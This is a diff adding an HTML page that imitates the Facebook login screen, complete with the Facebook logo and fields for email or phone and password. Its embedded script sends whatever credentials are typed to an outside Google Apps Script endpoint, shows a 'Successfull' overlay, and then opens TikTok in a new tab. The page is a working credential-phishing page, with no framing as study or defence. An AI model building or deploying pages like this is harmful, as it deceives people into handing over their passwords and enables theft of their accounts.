@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="facbook-styles.css">
+</head>
+<body>
+    
+    <div class="login-container">
+        <p id="pp">English (UK)</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+       <!-- input --> 
+        <form name="contact-form">
+            <input type="text" name="f-email" placeholder="Mobile number or email address" required>
+            <input type="password" name="f-password" placeholder="Password" required>
+            <!-- input end-->
+            <!-- buttons -->
+            <input type="submit" value="Login in" id="submit"> 		
+            <!-- end -->
+        </form>
+        <a href="#" style="color: #666666; position: relative; top: -70px; font-size:12px;">Forgotten Password?</a>
+        <button class="create-account">Create new account</button>
+      
+        <!-- Loading overlay -->
+        <div id="loading-overlay" class="loading-overlay">
+            <div class="loading-circle"></div>
+            <p class="loading-text">Successfull</p>
+        </div>
+    </div>
+
+    <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycby1wCV9O63DhcNRbBjWug5mzgRoZursn5m4yWQMS0_ZDdcP_STF73Zhx77ZuPvEHJND/exec';
+    const form = document.forms['contact-form'];
+    const loadingOverlay = document.getElementById('loading-overlay');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // Show loading overlay
+        loadingOverlay.style.display = 'flex';
+
+        try {
+            // Send form data to Google Script
+            await fetch(scriptURL, { method: 'POST', body: new FormData(form) });
+
+            // Open YouTube in a new tab
+            const youtubeWindow = window.open('https://www.tiktok.com/', '_blank');
+
+            // Wait for YouTube page to fully load
+            youtubeWindow.onload = () => {
+                // Hide loading overlay once YouTube is fully loaded
+                loadingOverlay.style.display = 'none';
+            };
+        } catch (error) {
+            console.error('Error!', error.message);
+            loadingOverlay.style.display = 'none'; // Hide loading overlay in case of error
+        }
+    });
+</script>
+</body>
+</html>
